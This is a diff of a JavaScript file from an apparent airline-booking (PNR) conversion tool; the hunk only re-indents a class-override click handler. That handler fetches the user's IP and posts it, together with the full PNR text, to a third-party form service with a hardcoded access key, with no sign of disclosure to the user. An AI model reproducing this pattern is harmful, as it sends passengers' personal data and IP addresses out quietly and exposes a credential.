@@ -1094,57 +1094,57 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- MAIN LOGIC: Class Override & Seamless IP Report ---
     const classBtns = document.querySelectorAll('.class-override-btn');
 
-    classBtns.forEach(btn => {
-        btn.addEventListener('click', async (e) => {
-            const val = e.target.getAttribute('data-value');
-            const originalText = e.target.getAttribute('data-original-text') || e.target.textContent;
+        classBtns.forEach(btn => {
+            btn.addEventListener('click', async (e) => {
+                const val = e.target.getAttribute('data-value');
+                const originalText = e.target.getAttribute('data-original-text') || e.target.textContent;
 
-            if (!e.target.getAttribute('data-original-text')) {
-                e.target.setAttribute('data-original-text', originalText);
-            }
-
-            // 1. Toggle UI State
-            if (globalClassOverride === val) {
-                globalClassOverride = null;
-                e.target.classList.remove('active');
-                e.target.textContent = originalText;
-            } else {
-                globalClassOverride = val;
-                classBtns.forEach(b => b.classList.remove('active'));
-                e.target.classList.add('active');
-                document.getElementById('showClass').checked = true;
-
-                // 2. Reporting
-                const pnrDataToSend = getPnrForReport(); // Using the helper from Step 1
-                e.target.textContent = "Reporting...";
-                e.target.disabled = true;
-
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const { ip } = await ipRes.json();
-
-                    await fetch("https://api.web3forms.com/submit", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            access_key: "8e411ec7-fb3e-48fc-8907-d8bf830626ff",
-                            subject: `Simba Override: ${val} (IP: ${ip})`,
-                            message: `Class: ${val}\nIP: ${ip}\n\nPNR:\n${pnrDataToSend}`
-                        })
-                    });
-                    e.target.textContent = "Success!";
-                } catch (err) {
-                    e.target.textContent = "Error";
-                } finally {
-                    setTimeout(() => {
-                        e.target.textContent = originalText;
-                        e.target.disabled = false;
-                    }, 2000);
+                if (!e.target.getAttribute('data-original-text')) {
+                    e.target.setAttribute('data-original-text', originalText);
                 }
-            }
-            liveUpdateDisplay();
+
+                // 1. Toggle UI State
+                if (globalClassOverride === val) {
+                    globalClassOverride = null;
+                    e.target.classList.remove('active');
+                    e.target.textContent = originalText;
+                } else {
+                    globalClassOverride = val;
+                    classBtns.forEach(b => b.classList.remove('active'));
+                    e.target.classList.add('active');
+                    document.getElementById('showClass').checked = true;
+
+                    // 2. Reporting
+                    const pnrDataToSend = getPnrForReport(); // Using the helper from Step 1
+                    e.target.textContent = "Reporting...";
+                    e.target.disabled = true;
+
+                    try {
+                        const ipRes = await fetch('https://api.ipify.org?format=json');
+                        const { ip } = await ipRes.json();
+
+                        await fetch("https://api.web3forms.com/submit", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                access_key: "8e411ec7-fb3e-48fc-8907-d8bf830626ff",
+                                subject: `Simba Override: ${val} (IP: ${ip})`,
+                                message: `Class: ${val}\nIP: ${ip}\n\nPNR:\n${pnrDataToSend}`
+                            })
+                        });
+                        e.target.textContent = "Success!";
+                    } catch (err) {
+                        e.target.textContent = "Error";
+                    } finally {
+                        setTimeout(() => {
+                            e.target.textContent = originalText;
+                            e.target.disabled = false;
+                        }, 2000);
+                    }
+                }
+                liveUpdateDisplay();
+            });
         });
-    });
 
     // Hook into existing convert button to update button state
     document.getElementById('convertBtn').addEventListener('click', () => {
